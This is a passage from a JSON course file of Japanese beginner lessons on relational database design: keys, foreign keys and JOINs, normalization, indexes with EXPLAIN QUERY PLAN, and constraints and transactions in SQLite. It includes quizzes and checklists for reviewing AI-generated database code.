typeof(n) FROM t\").fetchall()   # [('abc', 'text')]\n```\n\nSQLite は、`INTEGER` の列に文字列を入れても受け入れてしまいます（PostgreSQL や MySQL ではエラーになります）。\n厳しくしたいときは、テーブルの最後に `STRICT` を付けます。\n\n```python\nconn.execute(\"CREATE TABLE s (n INTEGER) STRICT\")\nconn.execute(\"INSERT INTO s VALUES ('abc')\")\n# sqlite3.IntegrityError: cannot store TEXT value in INTEGER column s.n\n```\n\n## 主キー：1 行を 1 つに決める名札\n\n**主キー（PRIMARY KEY）** は、行を 1 つに特定するための列です。**重複せず、空でもなく、変わらない** 値でなければいけません。\n\n| 方式 | 例 | よいところ | 注意 |\n|---|---|---|---|\n| **連番** | `1, 2, 3, …` | 短い・速い・分かりやすい | URL に出すと「全部で何件あるか」「他の人の番号」が推測できる |\n| **UUID** | `3f2b8c1e-...`（16 進数 32 文字） | 推測されにくい。データベースに聞かずに作れる | 長い。並び順に意味が無い（`UUIDv7` は作成順に並ぶ） |\n| メールアドレスなど（**自然キー**） | `ryo@example.com` | 意味がある | ⚠️ **変わる** ことがある。変えると関係するすべての行を直す必要がある |\n\nメールアドレスや電話番号は、**主キーにせず `UNIQUE` の列にする** のが定番です。主キーは、意味を持たない連番か UUID にします。\n\nSQLite では `INTEGER PRIMARY KEY` と書くと、自動で連番が振られます（バックエンドコースで見た `AUTOINCREMENT` は「消した番号を二度と使わない」という追加の約束）。\n\n## 1 つのマスに 1 つの値\n\n```text\n❌ よくない                              ✅ よい\nid | name | tags                          posts                post_tags\n1  | Ryo  | 日記,Python,旅行              id | title             post_id | tag\n                                          1  | 京都で Python      1       | Python\n                                                                 1       | 旅行\n```\n\n1 つのマスに `日記,Python,旅行` のように複数の値を入れると、「Python のタグが付いた投稿」を探すのも、タグの名前を変えるのも大変です。\n複数あるものは **別のテーブルに分けます**（次のレッスンの「多対多」）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `email TEXT PRIMARY KEY` | ⚠️ メールアドレスを主キーにしている。変更できるようにするなら連番か UUID に |\n| `NOT NULL` がほとんど無い | ⚠️ 必須の項目まで空を許している |\n| `tags TEXT` にカンマ区切りで保存 | ⚠️ 1 マスに複数の値。別テーブルに |\n| `price REAL` | ⚠️ お金を小数で持っている（コンピュータの基礎コースの「数値の落とし穴」）。整数で持つ |\n| `created_at TEXT` に `2026-11-21 17:36:18` | SQLite には日付の型が無いので、文字列で持つのが普通。並べ替えられる形（年-月-日）になっているか |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ユーザーのテーブルの主キーとして、いちばん適切なのは？",
        "choices": [
         "メールアドレス",
         "名前",
         "意味を持たない連番か UUID"
        ],
        "answer": 2,
        "explain": "メールアドレスは変わることがあり、名前は重複します。主キーは変わらない値にし、メールアドレスは `UNIQUE` の列にします。"
       },
       {
        "question": "`email TEXT NOT NULL UNIQUE` の列に、すでにあるメールアドレスを INSERT するとどうなる？",
        "choices": [
         "`UNIQUE constraint failed` のエラーになり、入らない",
         "古い行が上書きされる",
         "警告だけ出て、2 行目として入る"
        ],
        "answer": 0,
        "explain": "UNIQUE は重複を許しません。データベースがエラーにして守ってくれます。"
       },
       {
        "question": "投稿にタグを複数付けたい。設計としてよいのは？",
        "choices": [
         "`tags` 列に「日記,Python」とカンマ区切りで入れる",
         "`tag1`・`tag2`・`tag3` の列を作る",
         "投稿とタグの組み合わせを入れる別のテーブルを作る"
        ],
        "answer": 2,
        "explain": "1 マスに複数の値を入れたり、列を増やしたりすると、検索や変更が大変になります。組み合わせのテーブル（次のレッスン）で表します。"
       }
      ]
     ],
     "id": "01-tables-keys"
    },
    {
     "title": "1 対多・多対多 ― テーブルをつなぐ外部キー",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "database",
      "collections"
     ],
     "summary": "「ユーザーは投稿をたくさん持つ」「投稿とタグはお互いにたくさん」を表す外部キーと中間テーブル。JOIN で読み、ON DELETE で消し方を決める。SQLite の落とし穴も。",
     "body": "## このレッスンのゴール\n\n- 1 対多・多対多の関係を見分け、外部キーと中間テーブルで表せる\n- `JOIN` を使った SQL を読み、何と何をつないでいるか説明できる\n- `ON DELETE CASCADE` と、SQLite で外部キーを有効にする方法が分かる\n\n## 関係の 3 つの形\n\n| 関係 | 例 | 表し方 |\n|---|---|---|\n| **1 対 1** | ユーザー と プロフィール | 片方に相手の ID を持たせる（1 つのテーブルにまとめることも多い） |\n| **1 対多** | ユーザー 1 人 と 投稿たくさん | **「多」の側** に「1」の側の ID を持たせる |\n| **多対多** | 投稿 と タグ（投稿にタグがたくさん、タグも投稿がたくさん） | **中間テーブル** を作る |\n\n## 1 対多：外部キー\n\n```sql\nCREATE TABLE users (\n  id    INTEGER PRIMARY KEY,\n  name  TEXT NOT NULL\n);\n\nCREATE TABLE posts (\n  id       INTEGER PRIMARY KEY,\n  user_id  INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n  title    TEXT NOT NULL\n);\n```\n\n`posts.user_id` は「この投稿を書いたユーザーの id」です。`REFERENCES users(id)` は「この値は、必ず `users` テーブルの `id` のどれかでなければならない」という約束で、こういう列を **外部キー（FOREIGN KEY）** と呼びます。\n\n```text\nusers                    posts\nid | name                id | user_id | title\n1  | Ryo      ←──────── 1  | 1       | はじめての投稿\n            ←──────────  2  | 1       | 2 つ目\n2  | Hana     ←──────── 3  | 2       | こんにちは\n```\n\n⚠️ よくある間違いは、`users` の側に `post_ids` のような列を作ることです。「1」の側に「多」を入れると、1 マスに複数の値（前のレッスン）になってしまいます。**ID を持つのは「多」の側** です。\n\n### JOIN で読む\n\n```python\nconn.execute(\"\"\"\n    SELECT users.name, posts.title\n    FROM posts\n    JOIN users ON users.id = posts.user_id\n    ORDER BY posts.id\n\"\"\").fetchall()\n# [('Ryo', 'はじめての投稿'), ('Ryo', '2 つ目'), ('Hana', 'こんにちは')]\n```\n\n`JOIN users ON users.id = posts.user_id` は「posts の各行に、`user_id` と同じ `id` を持つ users の行をくっつける」という意味です。\n\n```python\nconn.execute(\"\"\"\n    SELECT users.name, COUNT(posts.id)\n    FROM users\n    LEFT JOIN posts ON posts.user_id = users.id\n    GROUP BY users.id\n\"\"\").fetchall()\n# [('Ryo', 2), ('Hana', 1)]\n```\n\n| JOIN の種類 | 結果 |\n|---|---|\n| `JOIN`（`INNER JOIN`） | 両方にある組み合わせだけ。投稿が 0 件のユーザーは出てこない |\n| `LEFT JOIN` | 左（`FROM` の側）は全部出す。相手がいなければ `NULL`（投稿 0 件のユーザーも 0 として数えられる） |\n\n## 消し方を決める：ON DELETE\n\nユーザーを消したら、その人の投稿はどうするか？を決めておきます。\n\n| 書き方 | ユーザーを消すと |\n|---|---|\n| `ON DELETE CASCADE` | 投稿も一緒に消える |\n| `ON DELETE SET NULL` | 投稿は残り、`user_id` が NULL になる（「退会したユーザー」） |\n| `ON DELETE RESTRICT`（または指定なし） | 投稿が残っている間は、ユーザーを消せない（エラー） |\n\n```python\nconn.execute(\"DELETE FROM users WHERE id = 1\")\nconn.execute(\"SELECT * FROM posts\").fetchall()\n# [(3, 2, 'こんにちは')]      ← Ryo の投稿 2 件も消えた（CASCADE）\n```\n\n## ⚠️ SQLite の外部キーは、初期設定で「オフ」\n\nここが SQLite 最大の落とし穴です。**何もしないと、外部キーの約束は守られません**。\n\n```python\nconn = sqlite3.connect(\"app.db\")\nconn.execute(\"INSERT INTO posts (user_id, title) VALUES (99, '幽霊')\")   # 存在しないユーザー 99 でも入ってしまう\n```\n\n接続するたびに、**最初に** 次の 1 行を実行します。\n\n```python\nconn = sqlite3.connect(\"app.db\")\nconn.execute(\"PRAGMA foreign_keys = ON\")     # 接続ごとに必要\n\nconn.execute(\"INSERT INTO posts (user_id, title) VALUES (99, '幽霊')\")\n# sqlite3.IntegrityError: FOREIGN KEY constraint failed   ← 守られた\n```\n\n実際に試したところ、**トランザクションの途中（INSERT や DELETE の後、commit の前）で実行しても効きませんでした**。必ず接続した直後に書きます。\nPostgreSQL・MySQL（InnoDB）では最初から有効です。\n\n## 多対多：中間テーブル\n\n投稿とタグのように、**どちらから見ても「たくさん」** の関係は、組み合わせを 1 行ずつ記録するテーブルを作ります。\n\n```sql\nCREATE TABLE tags (\n  id    INTEGER PRIMARY KEY,\n  name  TEXT NOT NULL UNIQUE\n);\n\nCREATE TABLE post_tags (\n  post_id  INTEGER NOT NULL REFERENCES posts(id) ON DELETE CASCADE,\n  tag_id   INTEGER NOT NULL REFERENCES tags(id)  ON DELETE CASCADE,\n  PRIMARY KEY (post_id, tag_id)\n);\n```\n\n```text\nposts                    post_tags              tags\nid | title               post_id | tag_id       id | name\n3  | こんにちは           3       | 1     ───→  1  | 日記\n10 | 京都で Python        10      | 2     ───→  2  | Python\n                         10      | 3     ───→  3  | 旅行\n```\n\n`PRIMARY KEY (post_id, tag_id)` は「**2 つの列の組み合わせ** が主キー」という意味で、同じ投稿に同じタグを 2 回付けられなくなります。\n\n```python\nconn.execute(\"INSERT INTO post_tags VALUES (10, 2)\")    # もう付いている\n# sqlite3.IntegrityError: UNIQUE constraint failed: post_tags.post_id, post_tags.tag_id\n```\n\n### 2 回 JOIN して読む\n\n```python\nconn.execute(\"\"\"\n    SELECT posts.title, tags.name\n    FROM posts\n    JOIN post_tags ON post_tags.post_id = posts.id\n    JOIN tags      ON tags.id = post_tags.tag_id\n    ORDER BY posts.id, tags.id\n\"\"\").fetchall()\n# [('こんにちは', '日記'), ('京都でPython', 'Python'), ('京都でPython', '旅行')]\n```\n\nposts → post_tags → tags と、**中間テーブルを通って 2 回つなぐ** のが多対多の読み方です。\n\n中間テーブルには、組み合わせについての情報を足すこともできます（例：`enrollments`（受講）テーブルに、学生 ID・講座 ID に加えて「受講開始日」「成績」）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `user_id INTEGER REFERENCES users(id)` | 1 対多の「多」の側。ユーザーごとに何件もある |\n| `PRIMARY KEY (a_id, b_id)` だけのテーブル | 多対多の中間テーブル |\n| `sqlite3.connect(...)` の後に `PRAGMA foreign_keys = ON` が無い | ⚠️ SQLite なら外部キーが守られていない |\n| `ON DELETE CASCADE` | ✅／⚠️ 便利だが、親を 1 件消すと関係するものが **全部消える**。本当にそれでよいか |\n| `JOIN` と `LEFT JOIN` | 0 件のものを結果に含めたいかどうかで使い分けているか |\n| ID の列に外部キーの指定が無い（`user_id INTEGER` だけ） | ⚠️ 存在しない ID が入っても気づけない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「ユーザー 1 人がたくさんの注文をする」関係で、外部キーを置くのはどこ？",
        "choices": [
         "users テーブルに `order_ids` 列を作る",
         "orders テーブルに `user_id` 列を作る",
         "必ず中間テーブルを作る"
        ],
        "answer": 1,
        "explain": "1 対多では「多」の側（orders）に「1」の側（users）の ID を持たせます。中間テーブルは多対多のときに使います。"
       },
       {
        "question": "SQLite で `user_id INTEGER REFERENCES users(id)` と書いたのに、存在しない user_id の行が入ってしまった。原因は？",
        "choices": [
         "REFERENCES の書き方が間違っている",
         "接続ごとに `PRAGMA foreign_keys = ON` を実行していない",
         "SQLite は外部キーに対応していない"
        ],
        "answer": 1,
        "explain": "SQLite は初期設定で外部キーのチェックがオフです。接続した直後に `PRAGMA foreign_keys = ON` を実行します。"
       },
       {
        "question": "学生と講座（1 人が何講座も取り、1 講座に何人もいる）を表す設計として正しいのは？",
        "choices": [
         "students に `course_id` を持たせる",
         "courses に `student_id` を持たせる",
         "`student_id` と `course_id` の組み合わせを入れる中間テーブルを作る"
        ],
        "answer": 2,
        "explain": "どちらから見ても「たくさん」なので多対多です。片方に ID を持たせると、1 人 1 講座しか表せません。"
       }
      ]
     ],
     "id": "02-relations"
    },
    {
     "title": "正規化 ― 同じことを 2 回書かない",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "database",
      "reading"
     ],
     "summary": "Excel の表のような 1 枚のテーブルで起きる「直し漏れ」「消えてしまう」問題と、テーブルを分けて解決する正規化。あえて分ける・分けないの判断も。",
     "body": "## このレッスンのゴール\n\n- 1 枚の大きな表で起きる 3 つの問題（更新・削除・追加の異常）を説明できる\n- 表を見て、「同じことが何度も書かれている」部分を見つけ、テーブルに分けられる\n- あえて正規化しない（非正規化する）場面と、その注意点が分かる\n\n## Excel のような 1 枚の表\n\n注文を Excel で管理していたら、こんな表になりそうです。\n\n| order_id | customer | customer_phone | product | price | qty |\n|---|---|---|---|---|---|\n| 1 | Ryo | 090-1111-1111 | りんご | 120 | 3 |\n| 2 | Ryo | 090-1111-1111 | 牛乳 | 200 | 1 |\n| 3 | Hana | 080-2222-2222 | りんご | 120 | 2 |\n\n一見わかりやすいですが、**Ryo の電話番号が 2 回、りんごの値段が 2 回** 書かれています。これが問題の元です。\n\n## 3 つの問題（異常）\n\nこのテーブルを実際に SQLite に作って試しました。\n\n### ① 更新の異常：直し漏れ\n\n```python\nconn.execute(\"UPDATE orders SET customer_phone = '090-9999-9999' WHERE order_id = 1\")\nconn.execute(\"SELECT DISTINCT customer, customer_phone FROM orders WHERE customer = 'Ryo'\").fetchall()\n# [('Ryo', '090-9999-9999'), ('Ryo', '090-1111-1111')]   ← Ryo の電話番号が 2 つになった\n```\n\n1 行だけ直すと、**同じ人なのに電話番号が食い違います**。どちらが正しいのか、もう分かりません。\n\n### ② 削除の異常：一緒に消えてしまう\n\n```python\nconn.execute(\"DELETE FROM orders WHERE customer = 'Hana'\")   # Hana の注文を取り消した\nconn.execute(\"SELECT customer_phone FROM orders WHERE customer = 'Hana'\").fetchall()\n# []   ← Hana の電話番号まで消えた\n```\n\n注文を消しただけなのに、**お客さんの情報そのものが無くなりました**。\n\n### ③ 追加の異常：入れる場所がない\n\nまだ何も注文していない新しいお客さんや、まだ売れていない新商品を登録しようとすると、`order_id` や `qty` が空の、おかしな行を作るしかありません。\n\n## 分ける：正規化\n\n原因は、**「お客さん」「商品」「注文」という別々のものを 1 枚に詰め込んでいる** ことです。それぞれをテーブルにします。\n\n```sql\nCREATE TABLE customers (\n  id     INTEGER PRIMARY KEY,\n  name   TEXT NOT NULL,\n  phone  TEXT\n);\n\nCREATE TABLE products (\n  id     INTEGER PRIMARY KEY,\n  name   TEXT NOT NULL,\n  price  INTEGER NOT NULL          -- 円の整数\n);\n\nCREATE TABLE orders (\n  id           INTEGER PRIMARY KEY,\n  customer_id  INTEGER NOT NULL REFERENCES customers(id),\n  ordered_at   TEXT NOT NULL\n);\n\nCREATE TABLE order_items (          -- 1 つの注文に、商品がいくつも入る\n  order_id    INTEGER NOT NULL REFERENCES orders(id),\n  product_id  INTEGER NOT NULL REFERENCES products(id),\n  qty         INTEGER NOT NULL,\n  unit_price  INTEGER NOT NULL,      -- 注文した時点の値段（下で説明）\n  PRIMARY KEY (order_id, product_id)\n);\n```\n\n| 問題 | 分けた後 |\n|---|---|\n| ① 電話番号の直し漏れ | 電話番号は `customers` に 1 回だけ。1 か所直せば全部に反映 |\n| ② 注文を消すとお客さんも消える | 注文を消しても `customers` は残る |\n| ③ 注文前のお客さんを登録できない | `customers` に 1 行足すだけ |\n\nこのように、**1 つの事実を 1 か所にだけ書く** ようにテーブルを分けることを **正規化** と呼びます。\n\n### 正規化のルール（ざっくり）\n\n教科書では「第 1 正規形・第 2 正規形・第 3 正規形…」と段階で説明されますが、実際の設計では次の 3 つを確かめれば十分です。\n\n| 確かめること | ダメな例 |\n|---|---|\n| 1 マスに 1 つの値か（第 1 正規形） | `tags` に「日記,Python」 |\n| その列は、そのテーブルの「もの」の情報か | 注文のテーブルにお客さんの電話番号 |\n| 他の列から決まる値を、二重に持っていないか | `price` と `qty` があるのに `total` 列も持つ |\n\n## わざと「同じことを 2 回」書くとき\n\n### 注文時の値段は別に持つ\n\n上の `order_items.unit_price` は、`products.price` と同じ値が入るので、二重に書いているように見えます。\nでも、商品の値段は後で **値上げされる** かもしれません。`products.price` だけを見ていると、**過去の注文の金額まで変わってしまいます**。\n\n「注文した時点の値段」は、商品の今の値段とは **別の事実** なので、注文の側に持つのが正しい設計です。住所・税率なども同じです。\n\n### 速さのための非正規化\n\n正規化すると、読むときに JOIN が増えます。アクセスがとても多い画面では、あえて集計した値を持つことがあります。\n\n```sql\nALTER TABLE posts ADD COLUMN comment_count INTEGER NOT NULL DEFAULT 0;\n-- コメントが増えるたびに +1 する。一覧画面で毎回 COUNT しなくて済む\n```\n\nこれを **非正規化** と呼びます。⚠️ 代わりに、**コメントを追加・削除するすべての場所で、数を更新し忘れない** 必要があります（更新の異常と同じ危険が戻ってくる）。\n**最初は正規化して作り、測って遅かったところだけ非正規化する** のが基本の順番です（バックエンドコースの「速さの基本」：まず測る）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| 1 つのテーブルに `customer_name`・`customer_email`・`product_name`… と何でも入っている | ⚠️ 正規化されていない。直し漏れが起きる |\n| `orders` に `total` 列がある | 合計を二重に持っている。`order_items` と食い違わないように、計算して入れているか |\n| `order_items` に `unit_price` がある | ✅ 注文時点の値段を残している |\n| `comment_count`・`likes_count` | 非正規化。増減のたびに更新しているか、ずれたときに数え直す仕組みがあるか |\n| NoSQL（Firestore・MongoDB）で、同じ情報を何か所にもコピー | NoSQL は JOIN が苦手なので、コピーするのが普通。その代わり、更新のときに全部のコピーを直す必要がある |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "1 枚の注文表で、お客さんの電話番号を 1 行だけ直したら、同じ人の電話番号が 2 種類になった。この問題を何と呼ぶ？",
        "choices": [
         "更新の異常",
         "削除の異常",
         "追加の異常"
        ],
        "answer": 0,
        "explain": "同じ事実が何か所にも書かれていると、直し漏れで食い違いが起きます。お客さんのテーブルに分ければ、1 か所直すだけで済みます。"
       },
       {
        "question": "`order_items` に、`products.price` と同じ値の `unit_price` 列を持たせる理由は？",
        "choices": [
         "JOIN を書くのが面倒だから",
         "商品の値段が後で変わっても、注文した時点の値段を残すため",
         "正規化のルールでそう決まっているから"
        ],
        "answer": 1,
        "explain": "「今の値段」と「注文したときの値段」は別の事実です。注文の側に持たないと、値上げで過去の注文の金額まで変わってしまいます。"
       },
       {
        "question": "非正規化（集計値などをわざと持たせること）について正しいのは？",
        "choices": [
         "いつも正規化より優れているので、最初から使う",
         "読むのは速くなるが、元のデータが変わるたびに更新し忘れない仕組みが必要",
         "データベースが自動で値をそろえてくれるので、注意はいらない"
        ],
        "answer": 1,
        "explain": "非正規化は速さと引き換えに、食い違いの危険を自分で管理するやり方です。測って必要なところにだけ使います。"
       }
      ]
     ],
     "id": "03-normalization"
    },
    {
     "title": "インデックス ― 本の索引で速く探す",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "database",
      "performance"
     ],
     "summary": "インデックスの仕組みと、EXPLAIN QUERY PLAN で「全部読んでいるか、索引を使っているか」を確かめる方法。複合インデックスの列の順番、効かない書き方、書き込みが遅くなる代償。",
     "body": "## このレッスンのゴール\n\n- インデックスが何で、なぜ検索が速くなるのかを説明できる\n- `EXPLAIN QUERY PLAN` の結果（`SCAN` と `SEARCH`）を読める\n- 複合インデックスの列の順番と、インデックスが使われない書き方が分かる\n\nバックエンドコースのレッスン 14 で「インデックスを付けたら速くなった」ことを見ました。ここでは **どこに付けるか・本当に使われているか** を確かめる方法を学びます。\n\n## インデックス ＝ 本の索引\n\n1000 ページの本で「正規化」という言葉を探すとき、1 ページ目から全部読むのは大変です。巻末の **索引** を見れば、「正規化 …… 213 ページ」とすぐ分かります。\n\nデータベースの **インデックス** も同じで、**ある列の値を並べた、別の小さな表** です。値が並んでいるので、辞書を引くように素早く探せます（中身は B-tree という木の形）。\n\n## 実際に測る\n\n100 万件の注文テーブルで試しました。\n\n```python\nconn.execute(\"\"\"CREATE TABLE orders (\n    id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL,\n    status TEXT NOT NULL, created_at TEXT NOT NULL)\"\"\")\n# … 100 万行を入れる …\n\nsql = \"SELECT * FROM orders WHERE user_id = 1234\"\n```\n\n| | 1 回の検索にかかった時間 |\n|---|---|\n| インデックスなし | 約 50 ミリ秒 |\n| `CREATE INDEX idx_orders_user_id ON orders(user_id)` の後 | 約 0.035 ミリ秒（**約 1400 倍速い**） |\n\n（この環境での測定。数字は機械によって変わりますが、桁違いに速くなることは変わりません）\n\n## EXPLAIN QUERY PLAN：どう探すつもりか聞く\n\nSQL の前に `EXPLAIN QUERY PLAN` を付けると、データベースが **どうやって探すつもりか**（実行計画）を教えてくれます。\n\n```python\nfor row in conn.execute(\"EXPLAIN QUERY PLAN \" + sql):\n    print(row[3])\n```\n\n| インデックス | 表示 | 意味 |\n|---|---|---|\n| なし | `SCAN orders` | テーブルを **全部** 1 行ずつ読む（本を 1 ページ目から全部読む） |\n| あり | `SEARCH orders USING INDEX idx_orders_user_id (user_id=?)` | 索引を使って **探す** |\n\n**`SCAN` が出たら、インデックスが使われていない** と読みます。PostgreSQL では `EXPLAIN`（`EXPLAIN ANALYZE` で実際の時間も）を使い、`Seq Scan` が全件、`Index Scan` が索引です。\n\n## 複合インデックス：列の順番が大事\n\n```sql\nSELECT * FROM orders WHERE user_id = 1234 AND status = 'paid' ORDER BY created_at\n```\n\n`user_id` だけのインデックスだと、こうなりました。\n\n```text\nSEARCH orders USING INDEX idx_orders_user_id (user_id=?)\nUSE TEMP B-TREE FOR ORDER BY          ← 並べ替えのために、別に作業している\n```\n\n複数の列をまとめたインデックスを作ります。\n\n```sql\nCREATE INDEX idx_orders_user_status_created ON orders(user_id, status, created_at);\n```\n\n```text\nSEARCH orders USING COVERING INDEX idx_orders_user_status_created (user_id=? AND status=?)\n```\n\n`user_id` と `status` で絞り込み、`created_at` の順番もインデックスの中で決まっているので、**並べ替えの作業が消えました**。`COVERING INDEX` は「必要な列が全部インデックスに入っていたので、テーブル本体を見に行かずに済んだ」という意味です。\n\n### ⚠️ 左から順にしか使えない\n\n複合インデックスは、**電話帳の「名字 → 名前」の順** のようなものです。名字が分からないと、名前だけでは引けません。\n\n```sql\n-- インデックスは (user_id, status, created_at)\nSELECT * FROM orders WHERE status = 'paid' AND created_at >= '2026-12-01'\n```\n\n```text\nSCAN orders          ← 先頭の user_id を使っていないので、索引が使えない\n```\n\n| WHERE で使う列 | `(user_id, status, created_at)` のインデックスは |\n|---|---|\n| `user_id` | ✅ 使える |\n| `user_id` と `status` | ✅ 使える |\n| `user_id` と `status` と `created_at` | ✅ 使える |\n| `status` だけ／`status` と `created_at` | ❌ 使えない（先頭が無い） |\n\n**よく一緒に絞り込む列を、絞り込みに使う順（等しい `=` の列を先、範囲 `>=` や並べ替えの列を後）に並べる** のが基本です。\n\n## インデックスが使われない書き方\n\n実際に `EXPLAIN QUERY PLAN` で `SCAN` になったものです。\n\n| 書き方 | なぜ使えない | 直し方 |\n|---|---|---|\n| `WHERE created_at LIKE '%-12-%'` | 先頭が `%`（何でもよい）だと、索引のどこから探せばよいか分からない | `created_at >= '2026-12-01' AND created_at < '2027-01-01'` |\n| `WHERE user_id + 0 = 1234` | 列に計算をすると、索引の値とそのまま比べられない | `WHERE user_id = 1234` |\n| `WHERE lower(email) = ?` | 関数を通すのも同じ | 保存するときに小文字にそろえる（または関数のインデックスを作る） |\n\n## インデックスの代償\n\nインデックスはタダではありません。行を追加・変更するたびに、**索引も書き直す** 必要があります。\n\n| 30 万行の INSERT | かかった時間 |\n|---|---|\n| インデックスなし | 約 0.14 秒 |\n| インデックス 3 つ | 約 1.28 秒（約 9 倍） |\n\n| 付けるとよい列 | 付けなくてよい列 |\n|---|---|\n| `WHERE` でよく絞り込む列 | ほとんど検索に使わない列 |\n| `JOIN` でつなぐ外部キー（`posts.user_id` など） | 行がとても少ないテーブル（全部読んでも一瞬） |\n| `ORDER BY` でよく並べ替える列 | 値の種類が少ない列だけ（`status` だけ、など。複合の 2 番目以降なら有効） |\n\n主キーと `UNIQUE` の列には、自動でインデックスが作られます。**外部キーには自動では作られない**（SQLite・PostgreSQL）ので、JOIN に使う `user_id` などには自分で付けるのが定番です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `user_id INTEGER REFERENCES users(id)` はあるが、`CREATE INDEX ... (user_id)` が無い | ⚠️ JOIN や「この人の注文一覧」が、データが増えると遅くなる |\n| 全部の列に `CREATE INDEX` | ⚠️ 書き込みが遅くなり、容量も増える。使う検索に合わせて付ける |\n| `WHERE name LIKE '%' \\|\\| ? \\|\\| '%'`（部分一致の検索） | 普通のインデックスは効かない。件数が多いなら全文検索の仕組み（SQLite の FTS5 など）を検討 |\n| マイグレーションに `CREATE INDEX` がある | ✅ どの検索を速くするためか、PR の説明で確認 |\n| 「遅い」と言われてインデックスを足した | ✅ 足す前と後で `EXPLAIN` と時間を測っているか |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`EXPLAIN QUERY PLAN` の結果が `SCAN orders` だった。意味は？",
        "choices": [
         "テーブルの全部の行を順番に読んでいる（インデックスを使っていない）",
         "インデックスを使って素早く探している",
         "SQL に文法の間違いがある"
        ],
        "answer": 0,
        "explain": "SCAN は全件を読むこと。`SEARCH ... USING INDEX` と出ていれば、索引を使っています。"
       },
       {
        "question": "インデックス `(user_id, status, created_at)` があるとき、使われ**ない**検索は？",
        "choices": [
         "`WHERE user_id = 1`",
         "`WHERE user_id = 1 AND status = 'paid'`",
         "`WHERE status = 'paid'`"
        ],
        "answer": 2,
        "explain": "複合インデックスは左の列から順にしか使えません。先頭の user_id を使わない検索では索引を引けません。"
       },
       {
        "question": "「とりあえず全部の列にインデックスを付けよう」という案の問題点は？",
        "choices": [
         "インデックスは 1 テーブルに 1 つしか作れない",
         "INSERT や UPDATE のたびに全部の索引を書き直すので、書き込みが遅くなり容量も増える",
         "検索がかえって遅くなる"
        ],
        "answer": 1,
        "explain": "実際に、インデックス 3 つで INSERT が約 9 倍遅くなりました。よく使う検索に合わせて、必要なものだけ付けます。"
       }
      ]
     ],
     "id": "04-indexes"
    },
    {
     "title": "制約とトランザクション ― データを壊さない仕組み",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "database",
      "errors",
      "security"
     ],
     "summary": "CHECK・UNIQUE・外部キーでデータベースにルールを持たせ、トランザクションで「全部成功か、全部なかったことに」する。在庫の取り合いを 1 行の UPDATE で防ぐ方法も。",
     "body": "## このレッスンのゴール\n\n- 制約（CHECK・UNIQUE・NOT NULL・外部キー）をデータベースに持たせる理由を説明できる\n- トランザクションの「全部か無しか」を、送金の例で説明できる\n- 「読んでから書く」コードの競合に気づき、条件付きの UPDATE で直せる\n\n## 制約：データベースが守るルール\n\nアプリのコード（バックエンドコースのレッスン 6 のバリデーション）でチェックしていても、バグ・別のプログラム・手作業の SQL から、おかしなデータが入ることがあります。**最後の砦として、データベース自身にもルールを持たせます**。\n\n| 制約 | 例 | 守ること |\n|---|---|---|\n| `NOT NULL` | `name TEXT NOT NULL` | 空を許さない |\n| `UNIQUE` | `email TEXT UNIQUE` | 重複を許さない |\n| `CHECK` | `stock INTEGER CHECK (stock >= 0)` | 条件を満たさない値を許さない |\n| 外部キー | `user_id ... REFERENCES users(id)` | 存在しない相手を指さない |\n| `DEFAULT` | `status TEXT DEFAULT 'todo'` | 省略時の値（ルールではないが、空を防ぐ） |\n\n```python\nconn.execute(\"CREATE TABLE items (id INTEGER PRIMARY KEY, stock INTEGER NOT NULL CHECK (stock >= 0))\")\nconn.execute(\"INSERT INTO items VALUES (1, 1)\")\nconn.execute(\"UPDATE items SET stock = stock - 2 WHERE id = 1\")\n# sqlite3.IntegrityError: CHECK constraint failed: stock >= 0\n```\n\n在庫が 1 個しかないのに 2 個減らそうとすると、データベースが止めてくれました。\n\n### エラーを受け止める\n\n```python\ntry:\n    conn.execute(\"INSERT INTO users (name, email) VALUES (?, ?)\", (name, email))\n    conn.commit()\nexcept sqlite3.IntegrityError:\n    return {\"error\": \"このメールアドレスはすでに登録されています\"}, 409\n```\n\n「先に SELECT して、無ければ INSERT」と書くより、**INSERT してみて、UNIQUE のエラーを受け止める** ほうが確実です。SELECT と INSERT の間に、別の人が同じメールアドレスで登録するかもしれないからです（下の「競合」）。\n\n## トランザクション：全部か、無しか\n\nA さんから B さんに 300 円送金する処理は、2 つの UPDATE でできています。\n\n```text\n① B の残高を +300\n② A の残高を -300\n```\n\n① の後で ② が失敗したら、**お金が 300 円増えてしまいます**。そこで、2 つを **トランザクション** にまとめます。トランザクションの中の処理は、**全部成功して確定（commit）するか、1 つでも失敗したら全部なかったこと（rollback）になる** かのどちらかです。\n\n```python\nconn.executescript(\"\"\"\nCREATE TABLE accounts (name TEXT PRIMARY KEY, balance INTEGER NOT NULL CHECK (balance >= 0));\nINSERT INTO accounts VALUES ('A', 1000), ('B', 0);\n\"\"\")\n\ndef transfer(amount):\n    try:\n        with conn:      # ← この中がトランザクション。抜けるときに commit、例外なら rollback\n            conn.execute(\"UPDATE accounts SET balance = balance + ? WHERE name = 'B'\", (amount,))\n            conn.execute(\"UPDATE accounts SET balance = balance - ? WHERE name = 'A'\", (amount,))\n    except sqlite3.IntegrityError as e:\n        print(\"失敗:\", e)\n\ntransfer(300)\n# [('A', 700), ('B', 300)]\n\ntransfer(5000)\n# 失敗: CHECK constraint failed: balance >= 0\n# [('A', 700), ('B', 300)]     ← ① の「B に +5000」も取り消されている\n```\n\n（実際に実行した結果です）5000 円の送金では、① の UPDATE は成功していましたが、② が CHECK で失敗したので、**① ごと取り消されました**。\n\n| 書き方 | 意味 |\n|---|---|\n| `with conn:`（Python の sqlite3） | ブロックを抜けたら commit、例外が起きたら rollback |\n| 